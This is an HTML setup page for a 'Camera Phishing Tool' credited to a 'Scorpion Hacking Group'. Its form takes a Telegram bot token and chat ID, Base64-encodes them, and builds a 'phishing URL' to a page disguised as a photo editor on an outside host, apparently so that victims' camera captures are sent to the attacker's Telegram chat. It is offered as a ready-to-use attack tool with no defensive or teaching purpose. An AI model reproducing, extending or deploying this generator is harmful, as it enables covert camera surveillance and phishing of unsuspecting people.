<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scorpion Hacking Group</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            font-family: 'Arial', sans-serif;
            padding: 20px;
        }
        .setup-card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 2rem;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
        }
        .setup-card:hover {
            transform: translateY(-10px);
        }
        h1 {
            color: #fff;
            font-size: 2rem;
            margin-bottom: 1.5rem;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        input {
            width: 100%;
            padding: 0.8rem;
            margin: 0.8rem 0;
            border: none;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 1rem;
            transition: background 0.3s ease;
        }
        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
        }
        .btn {
            background: #ffcc00;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 10px;
            color: #333;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
            margin-top: 1rem;
        }
        .btn:hover {
            background: #e6b800;
            transform: scale(1.05);
        }
        #urlOutput {
            color: #f0f0f0;
            font-size: 0.9rem;
            word-break: break-all;
            margin-top: 1.5rem;
            padding: 0.8rem;
            background: rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }
        footer {
            position: fixed;
            bottom: 1rem;
            color: #fff;
            font-size: 0.9rem;
            text-align: center;
            width: 100%;
        }
        footer a {
            color: #ffcc00;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        footer a:hover {
            color: #e6b800;
        }
        .pulse {
            font-size: 1.5rem;
            color: #ffcc00;
            margin-top: 1rem;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        @media (max-width: 600px) {
            .setup-card {
                padding: 1.5rem;
            }
            h1 {
                font-size: 1.8rem;
            }
            input, .btn {
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
    <div class="setup-card">
        <h1>Scorpion Hacking Group</h1>
        <p>Camera Phishing Tool (Setup)</p>
        <input type="text" id="botToken" placeholder="Enter Telegram Bot Token">
        <input type="text" id="chatId" placeholder="Enter Telegram Chat ID">
        <button class="btn" onclick="generateUrl()">Generate Phishing URL</button>
        <div id="urlOutput"></div>
        <div class="pulse"></div>
    </div>
    <footer>
        Developed By <a href="https://t.me/ScorpionYug" target="_blank">Scorpion Yug</a> & Zara
    </footer>
    <script>
        function generateUrl() {
            const botToken = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            const urlOutput = document.getElementById('urlOutput');
            if (!botToken || !chatId) {
                urlOutput.innerText = 'Please enter both Bot Token and Chat ID!';
                return;
            }
            try {
                const encodedToken = btoa(botToken); // Base64 encode
                const encodedChatId = btoa(chatId);
                const phishingUrl = `https://scorpion-yug.netlify.com/photo-editor.html?t=${encodedToken}&c=${encodedChatId}`;
                urlOutput.innerHTML = `Your Phishing URL >>> <a href="${phishingUrl}" target="_blank">${phishingUrl}</a>`;
            } catch (err) {
                urlOutput.innerText = 'Error generating URL: Invalid input!';
            }
        }
    </script>
</body>
</html>
